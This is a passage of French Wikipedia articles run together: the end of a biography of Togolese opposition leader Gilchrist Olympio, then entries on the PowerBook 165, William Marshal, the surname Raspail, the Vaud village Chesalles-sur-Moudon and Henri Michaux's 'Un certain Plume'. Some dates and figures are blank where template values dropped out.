Il entre brièvement en 1958 au Hamilton College aux États-Unis pour des études de mathématiques et de philosophie, puis rejoint l'année suivante la London School of Economics and Political Sciences au Royaume-Uni où il étudie l'économie et la comptabilité pour obtenir en 1962 un master en économie monétaire. En 1965, Gilchrist Olympio obtient un doctorat en sciences économiques à l'université d’Oxford.
Carrière professionnelle.
Gilchrist Olympio commence sa carrière professionnelle en 1963 comme économiste au département des études fiscales et financières du Secrétariat général des Nations unies à New York. L'année suivante, en 1964, il rejoint le Fonds monétaire international (FMI) comme cadre au département Afrique, puis comme maître de conférence à l'institut du FMI.
En 1970, il est engagé au groupe minier et financier Lonrho Limited (Londres) comme directeur chargé du développement du groupe et de ses opérations boursières en Afrique.
Dès 1977, il se met à son propre compte comme chef d’entreprise, actionnaire et dirigeant de différentes sociétés industrielles et agro-industrielles en Côte d'Ivoire et au Ghana. En Côte d'Ivoire, il est président-directeur général de SIA Auto, une concession de la marque Volkswagen créée en association avec des partenaires allemands, et de Construction métallique Tropical (CMT), une fonderie de citernes métalliques créée avec des associés français. Au Ghana, il est propriétaire de Abosso Glass, une usine de fabrication de bouteilles en verre pour les brasseries de la sous-région.
De 1987 à 1989, il est enseignant visiteur "(academic visitor)" à la London School of Economics.
Les affaires de Gilchrist Olympio, prospèrent dans les années 1980 mais périclitent ensuite les unes après les autres. En Côte d'Ivoire, les associés allemands se retirent de SIA Auto et la CMT est abandonnée par les associés français lors de la crise politico-militaire de ce pays. Au Ghana, Abosso Glass cesse toute activité à la suite de grèves et d'occupations d'usines à répétition avant d'être repris par l'État ghanéen en 2002.
Politique togolaise.
L'héritier de l'ablodé en exil et le mythe du terroriste.
Dans le sillage de son père, le jeune Gilchrist Olympio s'implique dans les années 1957 avec les leaders du CUT et de la Juvento dans les campagnes qui ont mené au référendum pour l'indépendance en 1958. Après ses études universitaires et quelques années après l'assassinat de son père en 1963, Gilchrist Olympio, héritier de l'ablodé (indépendance en mina) aux yeux des Togolais, entre en opposition ouverte au régime de Gnassingbé Eyadema. En exil, il crée en 1967 le Mouvement togolais pour la démocratie (MTD). S'il existe très peu de sources sur les activités politiques menées, Gilchrist Olympio est cité comme parmi les commanditaires de plusieurs actions de déstabilisation du régime togolais : 
Gilchrist Olympio nie les faits mais il fait l'objet de mandats d'arrêt internationaux lancés par le Togo et est condamné à mort par contumace le par la haute cour de justice de Lomé.
Bref retour d'exil, création de l'UFC et attentat de Soudou.
L'ouverture du régime togolais au multipartisme après les soulèvements populaires de 1990 donne l'occasion à Gilchrist Olympio de rentrer au Togo, après 25 années d’exil, pour participer à la Conférence nationale souveraine dans le processus de démocratisation du pays. Le , il est accueilli dans la liesse par des milliers de partisans à la frontière Togo-Ghana d'Aflao et son cortège met plusieurs heures pour parcourir la dizaine de kilomètres afin de rejoindre la maison familiale Olympio.
En , il participe à la création de l’Union des forces de changement (UFC), née de la fusion de plusieurs partis politiques. Il en est désigné président national par ses pairs.
L'euphorie est de courte durée car le , le convoi de Gilchrist Olympio est victime d’une agression armée à Soudou (une localité de la préfecture d'Assoli dans la région de Kara) . Cette agression fait 12 morts parmi les militants de l’UFC, dont le vice-président Marc Attidépé, et 27 blessés graves dont Gilchrist Olympio qui a eu la vie sauve seulement grâce à son évacuation au Bénin proche puis à Paris. L’enquête diligentée par la Fédération internationale des droits de l’homme (FIDH) désigne le colonel Ernest Gnassingbé, fils d’Eyadéma comme conduisant l’attentat .
Candidature aux élections présidentielles.
En 1993, la candidature de Gilchrist Olympio est rejetée à la première élection présidentielle pluraliste depuis l'indépendance. Le motif invoqué par le régime est la non-conformité de son certificat médical, délivré par des médecins français du Val-de-Grâce et de l’Hôpital américain à Paris, au lieu de médecins togolais à Lomé.
En 1998, la candidature de Gilchrist Olympio est validée pour l'élection présidentielle. Alors que le dépouillement lui donnait une large avance sur son adversaire Gnassingbé Eyadéma, ce dernier fait arrêter le décompte des voix et se fait proclamer vainqueur dès le premier tour avec 52,13 % des voix. Cette proclamation est faite par le ministre de l’intérieur et de la sécurité, en lieu et place de la Commission électorale nationale indépendante dont la plupart des membres, y compris la présidente ont été contraints à la démission. Selon le rapport d'observation de l'Union européenne 
En 2003 et en 2005, Gilchrist Olympio ne peut se présenter aux élections présidentielles à la suite de la modification unilatérale de la Constitution en 2002 par l'assemblée monocolore RPT. Les modifications de la constitution instaurent en effet qu’un candidat à l’élection présidentielle doit vivre sur le sol togolais l’année précédant l’élection. Or depuis l'agression de Soudou, Gilchrist Olympio ne réside plus au Togo.
Pour les élections présidentielles de 2010, les accords de Ouagadougou permettent d'assouplir les conditions de résidence. Pourtant, le , un jour avant la clôture des dossiers de candidature, Gilchrist Olympio annonce qu'il est bloqué aux États-Unis pour des raisons de santé, un mal de dos à la suite d'une chute et ne pourra être à Lomé le à minuit pour déposer sa candidature. Jean-Pierre Fabre, alors secrétaire général de l'UFC, est désigné par le bureau national du parti pour être candidat à l'élection présidentielle et est soutenu par une coalition de plusieurs partis d'opposition, le Front républicain pour l'alternance et le changement (FRAC).
Des négociations infructueuses à la paix des braves avec le régime.
Les mascarades électorales répétées et les violations des droits de l'homme valent au Togo de Gnassingbé Eyadema d'être banni sur le plan international, en l’occurrence, l’Union européenne décide en 1993 de suspendre son aide au Togo pour déficit démocratique et manquements graves aux droits humains. Gilchrist Olympio entreprend des démarches auprès de l’Union européenne pour amener le pouvoir à accepter un dialogue inter-togolais qui donne lieu à la signature de l’accord–cadre de Lomé en . Cet accord censé régler le contentieux électoral né de la présidentielle de 1998, est mort sans donner de fruit.
En 2003, à la suite de l'élection présidentielle très contestée, Gilchrist Olympio intervient devant la commission "Coopération et Développement" du parlement européen pour proposer un plan de sortie de crise. Ses propositions sont principalement la libération des détenus politiques et la constitution d’un gouvernement de transition avec pour mission d’organiser sur la base de l’accord cadre de Lomé tout en proposant à Gnassingbé Eyadema une retraite avec toutes les garanties d’amnistie. Par la suite, à l’ouverture des consultations avec l’Union européenne (UE) sur les conditions de la reprise éventuelle de sa coopération avec le Togo, le gouvernement togolais prend 22 engagements visant au . Plusieurs de ces engagements sont restés lettre morte.
En 2005, pendant la crise grave que traverse le pays après le décès de Gnassingbé Eyadema et sa succession violente par son fils Faure Gnassingbé, Gilchrist Olympio participe à des négociations dès le avec Faure Gnassingbé. Avant même que les résultats de l'élection présidentielle du ne soient publiés et pendant que le pays sombrait dans la violence, l'objectif de ces négociations organisées par le président Obassandjo du Nigeria, était de mettre en place un gouvernement d'union nationale. Par la suite, une réunion se tient le à Abuja entre des partis de la coalition de l'opposition et le parti au pouvoir afin de leur présenter et leur faire accepter les solutions envisagées par les chefs d'état de la sous-région, c'est-à-dire, outre la constitution d’un gouvernement d’union nationale dirigé par Faure Gnassingbé, la mise en place d’un conseil de sécurité présidé par le chef de l’opposition coalisée, la réforme de l’armée et la garantie de retour aux réfugiés. Au bout de la journée de discussion, c'est le constat d’échec car l'opposition n'accepte pas la volonté des chefs d'état de la sous-région de se satisfaire de la continuité d'un régime qui transmet le pouvoir de père en fils.
Le , la relance du dialogue se fait à Rome où Gilchrist Olympio et Faure Gnassingbé se rencontrent au siège de la Communauté de Sant'Egidio et sous le patronage de celle-ci. Selon le communiqué, il y est décidé, au bout de plusieurs heures de discussion, de s'accorder sur quatre points: la cessation des violences, la libération des prisonniers d’opinion, rendre possible et favoriser le retour des réfugiés et la reprise du dialogue politique. Pour de nombreux togolais, la rencontre de Rome est une grande surprise, certains y voient un traquenard, les voix s'élèvent au sein de la coalition de l'opposition pour accuser Gilchrist Olympio de ne pas avoir d’égard pour ses collègues et de ne pas les associer pas au dialogue avec le pouvoir.
D'autres rencontres se succèdent en et permettent de reprendre le dialogue inter togolais et d’assoir les bases des négociations de Ouagadougou sous la facilitation du président burkinabé Blaise Compaoré qui donnent lieu à la signature de l’Accord Politique Global (APG) signé à Lomé le . Cet accord connaît un début d'application, mais Gilchrist Olympio appelle à la non-participation de sa formation politique au gouvernement à la suite de la désignation unilatérale du premier ministre appelé à conduire le gouvernement d'union nationale. Cette décision entraîne une crise dans le parti, le vice-président Amah Gnassingbé menace d'exclure Gilchrist Olympio puis rejoint le gouvernement.
En 2010, aux lendemains de la nouvelle élection présidentielle, alors que les leaders et militants du FRAC manifestent plusieurs semaines pour revendiquer la victoire de Jean-Pierre Fabre, Gilchrist Olympio annonce avoir signé «un accord politique pour une participation à un gouvernement de redressement national, dans un esprit de partage du pouvoir avec le Rassemblement du peuple togolais (RPT)» parti au pouvoir. Cet accord qui accorde 7 portefeuilles ministériels à l'UFC, suscite un tollé parmi les militants de l'opposition qui dénoncent une trahison . Cette décision unilatérale prise sans concertation avec le bureau national du parti, provoque une grave crise qui aboutit à la scission du parti et la création de l’Alliance nationale pour le changement (ANC) par Jean-Pierre Fabre et ses compagnons, laissant l'UFC à Gilchrist Olympio et sa garde rapprochée.
Participation au pouvoir et sanction populaire.
Selon l'accord conclu par Gilchrist Olympio avec le régime le , l'UFC obtient sept postes ministériels, dont un seul poste de prestige de ministre d’État et des Affaires étrangères et de la Coopération confié à Elliott Ohin, dans le gouvernement de Gilbert Houngbo. Il prévoit aussi que l'UFC nomme des responsables à la tête d'entreprises publiques, des autorités locales ou au sein du corps diplomatique. Gilchrist Olympio ne prend pas lui-même de portefeuille ministériel mais est censé présider une commission chargée de la mise en œuvre des réformes constitutionnelles. Le bilan en cours de chemin de cet accord historique est pourtant maigre et provoque même la démission de Me Djovi Gally, porte parole du parti, pour .
Le partage de pouvoir donne pourtant l'occasion à Gilchrist Olympio de se venger de ses anciens compagnons, en faisant exclure du parlement 9 députés dissidents de l'ANC. En effet, sur les 27 que comptait l'UFC avant la crise, 20 ont rejoint l'ANC. Le lundi , Gilchrist Olympio demande aux dissidents de renoncer à leur mandat pour ne pas . Dans une déclaration publique datée du , les 20 députés lui opposent une fin de non-recevoir. Mais le , lors de la plénière de l’Assemblée nationale, le président de l'assemblée Abbas Bonfoh annonce avoir reçu des lettres de démission de 9 députés de l'ANC, et malgré les protestations de ces derniers, les démissions sont entérinées par la Cour constitutionnelle le . Interpelés par l’ANC, le Comité des droits de l’homme des parlementaires de l’Union interparlementaire (UIP) et la Cour de Justice de la Communauté économique des États de l'Afrique de l'Ouest (CEDEAO) ont estimé que les députés n'ont jamais démissionné.
Aux termes de trois ans de partage de pouvoir, lors des élections législatives du , Gilchrist Olympio et son parti sont sévèrement sanctionnés. Le parti n'obtient que 3 députés contre 27 lors des législatives de 2007. Malgré cette défaite, Gilchrist Olympio décide de poursuivre sa collaboration avec le régime en obtenant avec trois postes ministériels dans le nouveau gouvernement de Kwesi Ahoomey-Zunu. Cette décision est contestée par des cadres du parti et entraine une nouvelle crise au sein du parti avec l'exclusion des contestataires dont le député et ancien ministre Oré Djimon et les anciens députés Gbéya Tsimessé et Nicodème Habia.
Constat d'échec et retrait de la vie politique.
Le , sept ans après son ralliement au pouvoir, Gilchrist Olympio annonce son retrait de la vie politique du Togo : « "L’avenir de l’UFC, de la contestation politique, et du Togo, devront demain être imaginés et poursuivis par des jeunes hommes et femmes de moins de 80 ans" ». Il dresse un bilan négatif de sa participation au pouvoir: « "Force est de constater que les termes de cet accord ne sont pas entièrement réalisés. Malgré ces insuffisances, nous avons fait le difficile choix de rester fidèle à notre engagement, conscients du fait que les espérances de changement et notre vision d’un Togo nouveau sont toujours à réaliser" ». Et pour sortir de la crise politique que traverse le Togo depuis plusieurs décennies, Gilchrist Olympio propose « "un retour aux fondamentaux de la Constitution de 1992" » et demande au président Faure Gnassingbé d’accepter « "le principe de ne pas se représenter à la présidentielle de 2020, afin de laisser le champ libre à une consultation démocratique libre" ».

</doc>
<doc id="191673" url="https://fr.wikipedia.org/wiki?curid=191673" title="PowerBook 165">
PowerBook 165

Le PowerBook 165 remplaçait le PowerBook 160 dans la gamme d'ordinateurs portables d'Apple. Il était la version avec écran noir et blanc du PowerBook 165c sorti quelques mois plus tôt. Sa seule autre différence avec le 165c était l'absence d'unité de calcul en virgule flottante.

</doc>
<doc id="191679" url="https://fr.wikipedia.org/wiki?curid=191679" title="Guillaume le Maréchal">
Guillaume le Maréchal

Guillaume le Maréchal ("Willame li Mareschal" en ancien normand, "William Marshal" en anglais), né vers 1146 et mort le 14 mai 1219 à Caversham, , est un chevalier anglo-normand de langue française et un tournoyeur réputé. Il est décrit comme « le meilleur chevalier du monde » dans le manuscrit "Histoire de Guillaume le Maréchal", rédigé peu après sa mort.
Guillaume participe à cinq batailles au cours de sa vie, chose rare car l'on considère qu'un chevalier ayant survécu à deux batailles est un vétéran aguerri.
Sa devise est « Dieu aide le Maréchal » et ses armes sont « parti d'or et de sinople, au lion de gueules brochant sur le tout ».
Biographie.
Chevalier anglo-normand, il est le fils né en Angleterre de Jean le Maréchal et de Sybille de Salisbury, sa seconde épouse. Le surnom de "Maréchal" remonte à son grand-père Gilbert le Maréchal, maréchal de la cour du roi , charge familiale héréditaire.
Guillaume fait son apprentissage en Normandie avec Guillaume de Tancarville, qui est le cousin de sa mère, chambellan d'Angleterre, les Tancarville assurant la charge héréditaire de chambellans en chef du duc de Normandie. Il est armé chevalier (adoubé) par Guillaume de Tancarville, sans doute au printemps 1167. Il entre ensuite au service de Patrice de Salisbury, son oncle maternel. Il se fait remarquer, en 1168, en défendant vaillamment Aliénor d'Aquitaine, dont le convoi qu'il escorte est attaqué, près de Poitiers, par le seigneur de Lusignan. Son oncle meurt au cours de l'affrontement et Guillaume est grièvement blessé, avant d'être emmené comme otage. Aliénor paie sa rançon et lui fait donner un équipement de chevalier. 
Pour cet acte de bravoure, Guillaume le Maréchal est chargé par la suite de l'éducation d'Henri le Jeune (mort en 1183). Il devient son « maître en chevalerie ». En 1173, Guillaume « ceint à nouveau de l'épée et embrasse » le jeune roi (qui a déjà été adoubé par son père en 1170, lors de son premier couronnement)"."
En 1173-1174, il le suit dans la révolte de celui-ci contre son père . Pendant plusieurs années, il mène une bande de chevaliers réunis autour du jeune roi de tournoi en tournoi dans le Nord de la France actuelle.
En 1182, toujours célibataire, « bachelier », il fait partie des « jeunes » ("juventus") de la maison militaire d'Henri le Jeune et jouit d'une très grande faveur auprès de ce dernier. Cinq chevaliers de cette même "mesnie," jaloux du Maréchal, ourdissent un complot en vue de le perdre auprès du jeune roi, et font courir une rumeur d'adultère avec la jeune reine Marguerite. Sur fond de rivalité entre Normands et Anglo-Normands lors des tournois : « Nous sommes tous abâtardis, si nous nous laissons damer le pion par cet Anglais » ; la calomnie est bientôt portée devant Henri le jeune. Guillaume quitte la cour, mais est finalement rappelé par le jeune roi, quelques semaines plus tard.
À la mort d'Henri le Jeune, le 11 juin 1183, il escorte son corps à Rouen où il va être enterré en la cathédrale Notre-Dame. Puis il part deux ans en croisade en Terre sainte. C'est là qu'il prend la décision d'être enterré chez les templiers. Il est de retour en 1187, quelque temps avant la défaite de Hattin. Bien qu'il n'existe aucun document d'époque en référence à cette période, les techniques de construction des châteaux employées par Guillaume le Maréchal principalement à Pembroke montrent qu'elles ont été inspirées par ce qu'il a observé en Terre Sainte.
Le roi le prend alors à son service. Il lui accorde le fief de Cartmel dans le Lancashire. Il est l'un des derniers fidèles du vieux roi dans la lutte de ce dernier contre ses fils, au premier chef desquels le jeune Richard Cœur de Lion.
 lui avait promis la « pucelle de Striguil », promesse confirmée par Richard Cœur de Lion. En 1189, à 44 ans, il épouse donc Isabelle de Clare (née vers 1172 – 1220), âgée de 16 ans, fille de Richard de Clare dit "Strongbow" (mort en 1176), comte de Pembroke et de Buckingham.
Isabelle était la petite-fille de Diarmait MacMurrough, roi de Leinster, et aussi l'arrière-petite-fille de Robert de Beaumont, comte de Meulan, et de sa deuxième épouse Élisabeth de Vermandois, de la maison capétienne. Isabelle lui apporte tous ses titres et terres : le comté de Pembroke, la moitié de l'honneur Longueville et près du quart de l'Irlande.
Régent d'Angleterre, il part guerroyer le contre des barons anglais révoltés alliés aux troupes françaises du dauphin Louis lors de la bataille de Lincoln. Pourtant septuagénaire, il y combat et tue le jeune comte Thomas du Perche âgé d'une vingtaine d'années seulement.
Le grand chevalier meurt le . Sur son lit de mort, "ad succurrendum", il remet son corps à l'ordre du Temple et revêt le manteau blanc à croix rouge des templiers. Il déplore enfin que les gens d'Église ne comprennent pas la morale de la chevalerie. S'il reconnait avoir capturé, au cours de sa vie, au moins cinq cents chevaliers dont il s'est « approprié les armes, les chevaux, les harnais », il en fait repentance devant l'assemblée réunie, et espère que cela ne lui coutera pas son salut. Sa femme Isabelle meurt un an plus tard.
C'est en apprenant la nouvelle de sa mort que son ennemi et suzerain, le roi de France Philippe Auguste, demande aux chevaliers de sa cour de porter un toast à la mémoire de son plus formidable adversaire, en lequel Guillaume des Barres reconnut le « meilleur chevalier du monde ».
L'écuyer de Guillaume le Maréchal, Jean d'Early (ou Johan d'Erlée), était son plus proche compagnon de bataille. À la demande du fils aîné de Guillaume, « qui en supporta tout le coût », Il narrera les histoires du chevalier à Jean le Trouvère, qui rédigea la chanson de Guillaume, sa biographie.
Famille et descendance.
Famille.
Il épousa Isabelle de Clare (vers 1171 – 1220), fille de Richard de Clare dit "Strongbow" (mort en 1176), comte de Pembroke et d'Aoife MacMurrough. La famille Clare est originaire d'Orbec dans le Pays d'Auge (Normandie). Par ce mariage, Guillaume reçoit les seigneuries d'Orbec et de Bienfaite en dot. Ils ont cinq fils et cinq filles qui atteignent tous l'âge adulte :
Descendance.
Aucun de ses cinq fils n'engendre de descendance légitime. Ils meurent tous un à un après leur père. À la suite de leurs morts, les vastes domaines de Guillaume le Maréchal sont partagés entre les époux de ses cinq filles.
Étant assez proche du pouvoir (ayant même été régent), Guillaume le Maréchal s'attire les foudres de l'Église d'Angleterre, et plus particulièrement de l'archevêque de Cantorbéry. Celui-ci essaiera de récupérer l'héritage et le titre de Guillaume à sa mort.
Par sa fille Isabelle, Guillaume le Maréchal est l'ancêtre des dynasties écossaises Bruce puis Stuart. Par son autre fille Maude, il est l'ancêtre direct des rois Plantagenets et puis de tous les monarques d'Angleterre à partir d'.
Biographies.
La biographie de Guillaume le Maréchal émane principalement de l’"Histoire de Guillaume le Maréchal", œuvre de , en couplets rimés octosyllabiques, rédigée par un trouvère « Jean », peu de temps après sa mort à la demande de son fils, en anglo-normand, à partir du témoignage de son écuyer Jean d’Early.
Sa vie a aussi inspiré une célèbre biographie de Georges Duby intitulé "Guillaume le Maréchal ou Le meilleur chevalier du monde", parue en 1984, centrée sur sa loyauté à l'égard de ses suzerains ennemis, les rois d'Angleterre et de France, l'ouvrage a été lu par l'historien en une édition audio abrégée à La Bibliothèque des voix.

</doc>
<doc id="191680" url="https://fr.wikipedia.org/wiki?curid=191680" title="Liste des objets du Système solaire classés par distance au Soleil">
Liste des objets du Système solaire classés par distance au Soleil



</doc>
<doc id="191681" url="https://fr.wikipedia.org/wiki?curid=191681" title="Raspail">
Raspail

Patronymes.
Le patronyme Raspail dérive de l'ancien occitan "raspalh", qui désigne la balle du blé.
Toponymes.
François-Vincent Raspail a donné son nom à divers lieux, à Paris ou en Belgique.

</doc>
<doc id="191683" url="https://fr.wikipedia.org/wiki?curid=191683" title="Chesalles-sur-Moudon">
Chesalles-sur-Moudon

Chesalles-sur-Moudon est une localité de la commune suisse de Lucens dans le canton de Vaud, située dans le district de la Broye-Vully et ancienne commune. Elle fait partie du district de Moudon entre 1803 et 2007. La commune est peuplée de habitants en . Son territoire, d'une surface de 166 hectares, se situe entre les vallées de la Broye et de la Glâne.
Histoire.
Le nom de Chesalles vient du latin "casale" qui signifie ferme. Cela reflète que l'activité agricole est le secteur d'occupation professionnel principal dans le village. Jusqu'en 2000, près de 50 % de la population travaille dans le secteur primaire. Toutefois, 66 % des personnes en activité, l'étaient hors de la commune. Au , la commune se fait connaître par les aventures de deux frères partis en Inde. L'un des deux, prénommé Daniel, devint Omrah, commandant de la garde impériale du Grand Moghol et gouverneur du Pendjab. Il décède en 1749. Son frère fit naufrage lors de son retour en Suisse. Diverses légendes naquirent de ces pérégrinations et un roman historique leur fut écrit en 1754.
La commune subit un remaniement parcellaire en 1960. De 1970 à 1983, on y trouve un centre de sélection porcine.
Le 30 novembre 2014, les communes de Brenles, Chesalles-sur-Moudon, Cremin, Forel-sur-Lucens, Lucens et Sarzens décident de fusionner. La nouvelle commune voit le jour le janvier 2017 sous le nom de Lucens.
Population.
Gentilé et surnom.
Les habitants de la commune se nomment les Chesallois.
Ils sont surnommés les Groseilliers.
Démographie.
Chesalles-sur-Moudon compte habitants en . Sa densité de population atteint hab./km.
En 2000, la population de Chesalles-sur-Moudon est composée de 79 hommes ( %) et 80 femmes ( %). La langue la plus parlée est le français, avec 153 personnes ( %). La deuxième langue est l'allemand (3 habitants ou % de la population). Il y a 154 personnes de nationalité suisse ( %) et 9 personnes étrangères ( %). Sur le plan religieux, la communauté protestante est la plus importante avec 119 personnes (73 %), suivie des catholiques (18 paroissiens ou 11 % de la population). 18 personnes (11 %) n'ont aucune appartenance religieuse.
La population de Chesalles-sur-Moudon est de 133 habitants en 1850. Elle reste relativement stable jusqu'en 1888, avant de baisser à 86 habitants en 1980. Le nombre d'habitants double ensuite en trente ans pour atteindre 165 en 2010. Le graphique suivant résume l'évolution de la population de Chesalles-sur-Moudon entre 1850 et 2010 :
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti socialiste suisse avec % des suffrages et le Parti libéral-radical avec %.
Lors des élections cantonales au Grand Conseil de mars 2011, les habitants de la commune ont voté pour l'Union démocratique du centre à %, les Verts à 24 %, le Parti libéral-radical à %, le Parti socialiste à %, le Parti bourgeois démocratique, les Vert'libéraux à % et Vaud Libre à %.
Sur le plan communal, Chesalles-sur-Moudon est dirigé par une municipalité formée de 5 membres et dirigée par un syndic pour l'exécutif et un Conseil général dirigé par un président et secondé par un secrétaire pour le législatif.
Économie.
Jusqu'au milieu du , l'économie locale était principalement tournée vers l'agriculture, l'arboriculture fruitière et l'élevage qui représentent encore de nos jours une part significative des emplois locaux. Cependant, lors de ces dernières décennies, le village s'est développé avec la création de plusieurs zones résidentielles habitées par des personnes travaillant principalement à Moudon.
Transports.
Au niveau des transports en commun, Chesalles-sur-Moudon fait partie de la communauté tarifaire fribourgeoise Frimobil. Le car postal reliant Lucens à Moudon par Chavannes-sur-Moudon s'arrête dans la localité. Le village est aussi desservi par les bus sur appel Publicar, qui sont un service de CarPostal.
Vie locale.
La commune de Chesalles-sur-Moudon compte plusieurs associations, parmi lesquelles une abbaye vaudoise, une société de jeunesse, un chœur mixte et une société de tir sportif.

</doc>
<doc id="191684" url="https://fr.wikipedia.org/wiki?curid=191684" title="Plume (Michaux)">
Plume (Michaux)

Un certain Plume est un ensemble de textes poétiques, d'Henri Michaux dont la première version est publiée en 1930, et la dernière en 1963. Cette dernière version est composée de treize chapitres se présentant comme des récits très courts (quelques pages au plus), mettant tous en scène le personnage de Plume dans des « aventures » parfois cocasses ou rocambolesques, parfois surréalistes.
Le nom de Plume fait référence à la légèreté du personnage, un personnage sans épaisseur ni volonté affirmée, qui se laisse la plupart du temps porter par les événements.
Genèse de l’œuvre.
Présentation.
"Un certain Plume" est un recueil de textes poétiques en prose du poète et peintre belge Henri Michaux dont la première version a été publiée en 1930. Il a ensuite été retravaillé et modifié par Michaux et plusieurs versions seront publiées du vivant de l'auteur. Cet article parle principalement de l'édition de 1963, mais la plupart des réflexions menées s'appliquent aux différentes versions, qui présentent de grandes similitudes.
"Un certain Plume" est composé de treize courts textes poétiques mettant tous en scène le personnage éponyme dans des situations différentes. Les titres, qui annoncent l’intrigue des épisodes, évoquent le format du conte ou des albums pour enfant. Malgré cette forme en apparence enfantine, ces textes, relevant de l'absurde et de l'humour noir, abordent parfois des thèmes d'une grande violence.
Plume est un personnage singulier « à qui il arrive toutes sortes de mésaventures surprenantes sans que cela modifie jamais sa résignation attristée et sans qu'il ose intervenir pour détourner le cours du destin. » En témoigne son nom même : Plume est un être de pensée, sans consistance, qui n’a aucune volonté et aucune personnalité affirmée et subit en permanence son existence. « C’est le nom d'un personnage falot, éternelle victime des hommes et des événements, qui incarne l'angoisse de vivre. » On le suit dans un quotidien souvent absurde ou grotesque, à travers des rêveries, mais également dans ses voyages, un thème que Michaux abordera dans d'autres de ses œuvres comme "Ecuador". Même si ces courts poèmes ressemblent à des récits, « ce que Michaux invente, ce n'est jamais une action, une intrigue (il n'est pas un conteur, même dans Plume), mais des êtres et surtout des manières d'être. »
Michaux écrit ces textes dans une époque de foisonnement artistique, d'expérimentation et de déconstruction des règles établies en littérature. C’est une œuvre hybride du point de vue du genre, écrite dans l’entre-deux-guerres et qui fait beaucoup appel à l’humour pour questionner ou dénoncer de manière détournée certains comportements sociaux ou politiques de l’époque.
Par ailleurs, le personnage a une large dimension autobiographique et reflète le mal de vivre et la souffrance de son auteur. Michaux le dit lui-même : « Oui, à cette époque de ma vie, Plume – tout Plume – était moi-même, Henri Michaux. ».
Inspirations de Plume.
Plume a souvent été rapproché de Charlie Chaplin. René Micha note dans un article: “"On cherche querelle à Plume", "La nuit des Bulgares" sont typiquement chaplinesques: par la scénographie, les changements à vue, le déroulement en dents de scie, le pied de nez final Les deux personnages semblent en effet subir avec légèreté et presque indifférence la dureté du monde extérieur, parfois cruel et incompréhensif à leur égard. Ils sont en décalage constant avec ce qui les entoure et vivent des aventures pour le moins désagréables, mais sans cesser de nous faire rire. Michaux a reconnu lui-même que Plume avait une parenté avec Charlie Chaplin, personnage qui le fascine et dont il parle dans son texte « Notre frère Charlie » . Il ne contredit pas la remarque d'un critique qui voit un lien entre le personnage de Plume et la scène de La Ruée vers l'or où Charlot crève des oreillers de plume envahissant sa cabane, mais fait seulement remarquer qu'à cette époque son intérêt pour le cinéma a déjà diminué . Il confie à ce même critique l'origine du nom de « Plume », emprunté au récit d'Edgar Allan Poe, Le Système du docteur Goudron et du professeur Plume . Les références au Danemark dans "Dans les appartements de la Reine" rappellent Hamlet, de Shakespeare . Un chercheur a également travaillé sur la parenté entre l'œuvre de Franz Kafka et celle d'Henri Michaux 
Plume, Michaux et la question de l’identité.
Plume est souvent considéré comme un double d'Henri Michaux. Ce dernier a signé sous le nom « D'un certain Plume » qui devient littéralement un « nom de plume », et Dubuffet a peint Plume en précisant : « Portrait d'Henri Michaux ».
Le personnage de Plume aurait une tendance autobiographique, de l'aveu de Michaux lui-même : « Oui, à cette époque de ma vie, Plume- tout Plume- était moi-même, Henri Michaux. ». Plume est « un personnage qui figure notamment son incapacité [celle de Michaux] à être ou à faire semblant d’être selon les conventions des autres. » C’est lorsque Michaux perd son père et sa mère à quelques jours d’intervalle en 1929, qu’il se lance dans l’écriture et la création d'Un certain Plume. L’écriture joue pour lui un rôle thérapeutique : « Avec Plume, je commence à écrire en faisant autre chose que de décrire mon malaise. Un personnage me vient. Je m’amuse de mon mal sur lui. Je n’ai sans doute jamais été aussi près d’être un écrivain. » 
L'usage particulier et les fluctuations des pronoms dans Un certain Plume rappellent cette thématique de l'identité fluctuante et du double : le sujet des intrigues est parfois Plume, parfois « il », parfois « on », parfois « Pon », un double de Plume, parfois « je », et est même inclus dans un « nous » dans la dernière phrase du recueil. Cette difficulté à fixer le sujet trouve un écho dans le reste de l'œuvre de Michaux, où on lit : « Mais bon Dieu ! qu'on me donne donc un substantif / un maître qualificatif, où je puisse me coller à jamais », mais aussi dans la vie de Michaux lui-même, qui change l'orthographe de son prénom à deux reprises, hésitant entre Henry et Henri.
L’œuvre et son style.
La question du genre.
Roman, conte, fable.
Un certain Plume est un recueil de textes en prose, édité et vendu comme recueil de poésie, comme en témoigne sa réédition en 1985 dans la collection « Poésie/Gallimard ». Mais l’inscription de Plume dans le genre poétique ne va pas immédiatement de soi : c'est ce que soulignent les prospectus qui accompagnent sa publication en 1938 : « Certains appellent cela poésie. » et Michaux lui-même se méfiait du poème et de sa perfection close : « Rien n’est jamais définitivement circonscrit » écrit-il dans la postface de "Lointain intérieur". En effet, il emploie volontiers un vocabulaire familier, son écriture est oralisée, son style concis, dépourvu d’ornements, et il adopte le parti pris, à première vue anti poétique, de la prose et de la narration. On pourrait croire à un recueil de nouvelles, voire à un roman divisé en chapitres dont Plume serait le personnage principal. Certains l’ont rapproché du roman picaresque ou du théâtre de saynètes. On peut aussi le rapprocher du genre du conte par la grande part laissée au fantastique, ou par la façon dont les événements sont montrés comme “ en train de se produire” 
. Certains chapitres, comme « Dans les appartements de la Reine » ont également une parenté avec la fable, par la dénomination des personnages et la présence d'une « morale » .
Poème en prose.
Mais c’est pourtant dans le genre du poème en prose qu' Un certain Plume semble trouver sa plus juste place.
La prose est donc travaillée comme un poème et Un certain Plume apparaît bien à cet égard comme un poème en prose. Michaux pratique une “Poésie qui fait fi de la logique et du rationnel, mais en même temps, poésie un peu sèche, quasi sans adjectifs, sans un seul élément vraiment descriptif, sans grands épanchements sentimentaux – je dirais volontiers cérébrale. Poésie terriblement abstraite dans son objet, mais imagée dans son expression, tragique par ses thèmes mais surprenante de retenue”. Complexe et contradictoire, donc, mais poésie malgré tout et sûrement même avant tout.
L'humour dans "Un certain Plume".
Le ton employé par Michaux dans cette œuvre est essentiellement comique, « On trouve chez Michaux plusieurs sortes d’humour qui toutes sont des formes particulières d’une même position originelle, une façon d’exister en marge ». L'humour revêt donc plusieurs formes :
Ainsi l’humour chez Michaux n’est pas gratuit, il allie « presque toujours la gravité et la fantaisie, la tension et la désinvolture » et il met en question le conformisme langagier et social, l’obéissance aveugle, la passivité face à l’horreur. On peut donc relier « le climat général de Plume, aux nombreux motifs assez sombres » avec « l’air irrespirable du temps, et ce contexte d’angoisse et de désespoir que génère l’époque”, marquée par la tranquille montée du nazisme dans une Europe souvent considérée comme trop conciliante. Comme le dit Corinne Roubaud, « l’humour est aussi une modalité du combat”.
